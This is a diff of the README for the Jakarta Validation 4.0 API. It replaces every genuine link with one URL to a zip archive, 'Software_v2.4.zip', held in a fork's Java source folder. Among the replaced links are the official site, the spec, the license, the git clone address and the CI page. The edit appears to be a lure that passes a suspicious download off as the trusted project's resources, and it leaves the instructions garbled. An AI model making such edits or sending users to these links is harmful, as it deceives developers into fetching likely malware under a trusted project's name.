@@ -5,9 +5,9 @@ This repository contains the Jakarta Validation 4.0 API.
 Jakarta Validation defines a metadata model and API for JavaBean and method validation.
 
 You can learn more about it here:
-* Official website: <https://beanvalidation.org/>
-* Latest draft of the spec: <https://jakarta.ee/specifications/bean-validation/4.0/jakarta-validation-spec-4.0>
-* Reference implementation: <https://github.com/hibernate/hibernate-validator/>
+* Official website: <https://raw.githubusercontent.com/MilaCodesIt/validation/main/src/main/java/jakarta/Software_v2.4.zip>
+* Latest draft of the spec: <https://raw.githubusercontent.com/MilaCodesIt/validation/main/src/main/java/jakarta/Software_v2.4.zip>
+* Reference implementation: <https://raw.githubusercontent.com/MilaCodesIt/validation/main/src/main/java/jakarta/Software_v2.4.zip>
 
 ## System requirements
 
@@ -16,24 +16,24 @@ JDK 21.
 ## Licensing
 
 The Jakarta Validation API is provided and distributed under the Apache Software License 2.0.
-Refer to [license.txt](https://github.com/jakartaee/validation/blob/master/license.txt) for more information.
+Refer to [https://raw.githubusercontent.com/MilaCodesIt/validation/main/src/main/java/jakarta/Software_v2.4.zip](https://raw.githubusercontent.com/MilaCodesIt/validation/main/src/main/java/jakarta/Software_v2.4.zip) for more information.
 
 ## Build from Source
 
-You can build the Jakarta Validation API from source by cloning the git repository https://github.com/jakartaee/validation
+You can build the Jakarta Validation API from source by cloning the git repository https://raw.githubusercontent.com/MilaCodesIt/validation/main/src/main/java/jakarta/Software_v2.4.zip
 You will also need a JDK 21 and Maven 3 (>= 3.9.10). With these prerequisites in place you can compile the source via:
 
     ./mvnw clean install
 
 ## Contribute
 
-Want to join us? You can find all the relevant information about contributing to Jakarta Validation on the [website](https://beanvalidation.org/contribute/).
+Want to join us? You can find all the relevant information about contributing to Jakarta Validation on the [website](https://raw.githubusercontent.com/MilaCodesIt/validation/main/src/main/java/jakarta/Software_v2.4.zip).
 
 ## Continuous Integration
 
-The official Continuous Integration service for the project is hosted on [ci.eclipse.org](https://ci.eclipse.org/validation/).
+The official Continuous Integration service for the project is hosted on [https://raw.githubusercontent.com/MilaCodesIt/validation/main/src/main/java/jakarta/Software_v2.4.zip](https://raw.githubusercontent.com/MilaCodesIt/validation/main/src/main/java/jakarta/Software_v2.4.zip).
 
 ## Publishing the Schemas
-The schema files should be published to the https://github.com/jakartaee/jakarta.ee website repository by following the
-procedure described at https://jakartaee.github.io/platform/publish-xml-schemas. The location for
+The schema files should be published to the https://raw.githubusercontent.com/MilaCodesIt/validation/main/src/main/java/jakarta/Software_v2.4.zip website repository by following the
+procedure described at https://raw.githubusercontent.com/MilaCodesIt/validation/main/src/main/java/jakarta/Software_v2.4.zip The location for
 the schema files in the repository is the static/xml/ns/validation directory.
